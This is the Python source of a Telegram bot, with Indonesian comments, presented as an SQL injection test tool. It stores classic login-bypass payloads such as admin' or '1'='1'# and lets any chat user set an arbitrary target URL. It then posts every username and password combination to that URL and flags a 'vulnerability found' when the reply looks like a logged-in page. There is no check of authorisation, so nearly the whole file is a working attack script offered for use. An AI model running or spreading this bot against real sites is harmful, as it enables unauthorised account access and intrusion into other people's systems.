import itertools
import requests
import logging
import datetime
import os
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# ============================
# KONFIGURASI AWAL
# ============================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Ganti dengan token bot Anda

# Daftar username dan password untuk pengujian SQL Injection
usernames = ['admin', "admin' #", "admin' or '1'='1", "admin' or '1'='1'#"]
passwords = ['admin', "admin' #", "admin' or '1'='1", "admin' or '1'='1'#"]

# State untuk ConversationHandler
MENU_AWAL, PILIH_OPERASI, INPUT_URL, TAMBAH_USERNAME, TAMBAH_PASSWORD = range(5)

# Data sementara untuk menyimpan URL target dan daftar kredensial
user_sessions = {}

# ============================
# FUNGSI UTILITY & TAMPILAN
# ============================
def get_current_datetime():
    """Mendapatkan tanggal dan waktu saat ini"""
    now = datetime.datetime.now()
    return now.strftime("📅 %Y-%m-%d ⏰ %H:%M:%S")

def create_welcome_message():
    """Membuat pesan welcome yang menarik"""
    return f"""
✨ **SQL INJECTION TEST BOT** ✨

{get_current_datetime()}

🎯 **FITUR UTAMA:**
• 🔎 Brute Force SQL Injection
• ✏️ Ubah Target URL Dinamis
• 👤 Manajemen Username
• 🔑 Manajemen Password
• 📊 Monitoring Real-time

🚀 **SELAMAT DATANG DI TOOL PENETRATION TESTING!**
    """

def create_progress_bar(percentage, length=20):
    """Membuat progress bar visual"""
    filled = int(length * percentage // 100)
    empty = length - filled
    return f"[{'█' * filled}{'░' * empty}] {percentage:.1f}%"

# ============================
# FUNGSI BOT & HANDLER
# ============================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Memulai percakapan dan menampilkan menu utama."""
    user_id = update.effective_user.id
    user_sessions[user_id] = {
        'target_url': '', 
        'usernames': usernames.copy(), 
        'passwords': passwords.copy(),
        'start_time': datetime.datetime.now()
    }
    
    # Keyboard dengan emoji dan tata letak yang lebih baik
    keyboard = [
        ['🔎 Mulai Brute Force', '✏️ Ubah Target URL'], 
        ['👤 Tambah Username', '🔑 Tambah Password'],
        ['📊 Status Session', '❌ Keluar']
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text(
        create_welcome_message(),
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return PILIH_OPERASI

async def pilih_operasi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Menangani pilihan menu dari pengguna."""
    choice = update.message.text
    user_id = update.effective_user.id
    
    if choice == '🔎 Mulai Brute Force':
        if not user_sessions[user_id]['target_url']:
            await update.message.reply_text(
                "❌ **URL target belum diatur!**\n"
                "Silakan atur URL target terlebih dahulu dengan menu '✏️ Ubah Target URL'"
            )
            return PILIH_OPERASI
        
        await update.message.reply_text("🚀 **Memulai pengujian SQL Injection...**")
        await brute_force_attack(update, context)
        return await kembali_ke_menu(update, context)
        
    elif choice == '✏️ Ubah Target URL':
        await update.message.reply_text(
            "🌐 **Masukkan URL target baru:**\n"
            "Contoh: http://example.com/login"
        )
        return INPUT_URL
        
    elif choice == '👤 Tambah Username':
        await update.message.reply_text(
            "📝 **Masukkan username baru:**\n"
            "Contoh: admin' OR '1'='1"
        )
        return TAMBAH_USERNAME
        
    elif choice == '🔑 Tambah Password':
        await update.message.reply_text(
            "📝 **Masukkan password baru:**\n"
            "Contoh: password' OR '1'='1"
        )
        return TAMBAH_PASSWORD
        
    elif choice == '📊 Status Session':
        await show_session_status(update, context)
        return PILIH_OPERASI
        
    elif choice == '❌ Keluar':
        await update.message.reply_text(
            "👋 **Terima kasih telah menggunakan SQL Injection Test Bot!**\n"
            "Gunakan /start untuk memulai kembali."
        )
        return ConversationHandler.END
    
    await update.message.reply_text("❌ Pilihan tidak dikenali. Silakan pilih dari menu.")
    return PILIH_OPERASI

async def show_session_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Menampilkan status session pengguna"""
    user_id = update.effective_user.id
    session = user_sessions.get(user_id, {})
    
    status_text = f"""
📊 **STATUS SESSION**

🔗 **URL Target:** {session.get('target_url', 'Belum diatur')}
👥 **Total Username:** {len(session.get('usernames', []))}
🔐 **Total Password:** {len(session.get('passwords', []))}
⏱️ **Session Dimulai:** {session.get('start_time', 'Tidak tersedia')}

💡 **Tips:** Pastikan URL target sudah benar sebelum memulai testing.
    """
    await update.message.reply_text(status_text)

async def input_url(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Menyimpan URL target yang dimasukkan pengguna."""
    user_id = update.effective_user.id
    new_url = update.message.text
    
    # Validasi URL dasar
    if not new_url.startswith(('http://', 'https://')):
        await update.message.reply_text("❌ **Format URL tidak valid!** Harus dimulai dengan http:// atau https://")
        return INPUT_URL
    
    user_sessions[user_id]['target_url'] = new_url
    
    await update.message.reply_text(f"✅ **URL target berhasil diubah!**\n`{new_url}`", parse_mode='Markdown')
    return await kembali_ke_menu(update, context)

async def tambah_username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Menambahkan username baru ke daftar."""
    user_id = update.effective_user.id
    new_username = update.message.text
    
    if new_username in user_sessions[user_id]['usernames']:
        await update.message.reply_text("⚠️ Username sudah ada dalam daftar!")
    else:
        user_sessions[user_id]['usernames'].append(new_username)
        await update.message.reply_text(f"✅ **Username berhasil ditambahkan!**\n`{new_username}`", parse_mode='Markdown')
    
    return await kembali_ke_menu(update, context)

async def tambah_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Menambahkan password baru ke daftar."""
    user_id = update.effective_user.id
    new_password = update.message.text
    
    if new_password in user_sessions[user_id]['passwords']:
        await update.message.reply_text("⚠️ Password sudah ada dalam daftar!")
    else:
        user_sessions[user_id]['passwords'].append(new_password)
        await update.message.reply_text(f"✅ **Password berhasil ditambahkan!**\n`{new_password}`", parse_mode='Markdown')
    
    return await kembali_ke_menu(update, context)

async def kembali_ke_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Kembali ke menu utama."""
    keyboard = [
        ['🔎 Mulai Brute Force', '✏️ Ubah Target URL'], 
        ['👤 Tambah Username', '🔑 Tambah Password'],
        ['📊 Status Session', '❌ Keluar']
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    
    await update.message.reply_text(
        "🎛️ **Pilih operasi selanjutnya:**",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return PILIH_OPERASI

# ============================
# FUNGSI BRUTE FORCE
# ============================
async def attempt_login(username, password, target_url):
    """Fungsi untuk mencoba login dengan penanganan error yang lebih baik."""
    try:
        response = requests.post(
            target_url, 
            data={'username': username, 'password': password}, 
            timeout=10,
            headers={'User-Agent': 'SQL-Injection-Test-Bot/1.0'}
        )
        
        # Kriteria keberhasilan - bisa disesuaikan
        if response.status_code == 200:
            response_lower = response.text.lower()
            if any(indicator in response_lower for indicator in ["login berhasil", "welcome", "success", "dashboard"]):
                return True, "Login berhasil - kerentanan SQL Injection ditemukan! 🎯"
            elif "invalid" not in response_lower and "error" not in response_lower:
                return True, "Respons tidak biasa - mungkin rentan SQL Injection ⚠️"
        
        return False, "Login gagal"
    except requests.exceptions.RequestException as e:
        return False, f"Error koneksi: {str(e)}"

async def brute_force_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Melakukan serangan brute force dengan kombinasi username/password."""
    user_id = update.effective_user.id
    target_url = user_sessions[user_id]['target_url']
    usernames_list = user_sessions[user_id]['usernames']
    passwords_list = user_sessions[user_id]['passwords']
    
    # Pesan progress awal
    progress_msg = await update.message.reply_text("⏳ **Mempersiapkan pengujian...**")
    total_attempts = len(usernames_list) * len(passwords_list)
    current_attempt = 0
    
    combinations = list(itertools.product(usernames_list, passwords_list))
    
    for username, password in combinations:
        current_attempt += 1
        percentage = (current_attempt / total_attempts) * 100
        
        # Update progress
        progress_text = f"""
🔍 **SQL INJECTION TEST IN PROGRESS**

{create_progress_bar(percentage)}
📊 **Progress:** {current_attempt}/{total_attempts}
👤 **Username:** `{username}`
🔑 **Password:** `{password}`
⏰ **Waktu:** {get_current_datetime()}
        """
        
        try:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=progress_msg.message_id,
                text=progress_text,
                parse_mode='Markdown'
            )
        except Exception as e:
            logging.error(f"Error updating progress: {e}")
        
        # Attempt login
        success, message = await attempt_login(username, password, target_url)
        
        if success:
            # Vulnerability found!
            result_text = f"""
🎯 **VULNERABILITY FOUND!** 🎯

💡 **Kerentanan SQL Injection Terdeteksi!**

👤 **Username:** `{username}`
🔑 **Password:** `{password}`
🔗 **Target:** `{target_url}`
📝 **Detail:** {message}

🛡️ **Rekomendasi:** Perbaiki input validation dan gunakan parameterized queries!
            """
            await update.message.reply_text(result_text, parse_mode='Markdown')
            await context.bot.delete_message(
                chat_id=update.effective_chat.id,
                message_id=progress_msg.message_id
            )
            return
    
    # No vulnerability found
    await context.bot.edit_message_text(
        chat_id=update.effective_chat.id,
        message_id=progress_msg.message_id,
        text=f"""
❌ **TESTING COMPLETED**

📊 **Total Percobaan:** {total_attempts}
✅ **Status:** Tidak ditemukan kerentanan SQL Injection yang jelas

💡 **Catatan:** Hasil ini tidak menjamin 100% aman. Lakukan pengujian lebih lanjut.
        """,
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Membatalkan percakapan."""
    await update.message.reply_text(
        '❌ **Operasi dibatalkan.**\n'
        'Gunakan /start untuk memulai kembali.',
        parse_mode='Markdown'
    )
    return ConversationHandler.END

# ============================
# FUNGSI UTAMA
# ============================
def main() -> None:
    """Menjalankan bot."""
    # Setup logging
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Validasi token
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ ERROR: Ganti 'YOUR_BOT_TOKEN_HERE' dengan token bot Telegram Anda!")
        return
    
    # Create Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Setup Conversation Handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PILIH_OPERASI: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, pilih_operasi)
            ],
            INPUT_URL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, input_url)
            ],
            TAMBAH_USERNAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, tambah_username)
            ],
            TAMBAH_PASSWORD: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, tambah_password)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        allow_reentry=True
    )
    
    application.add_handler(conv_handler)
    
    # Start Bot
    print("=" * 50)
    print("🤖 SQL INJECTION TEST BOT BERJALAN")
    print(f"⏰ {get_current_datetime()}")
    print("💡 Gunakan /start di Telegram untuk memulai")
    print("=" * 50)
    
    application.run_polling()

if __name__ == '__main__':
    main()
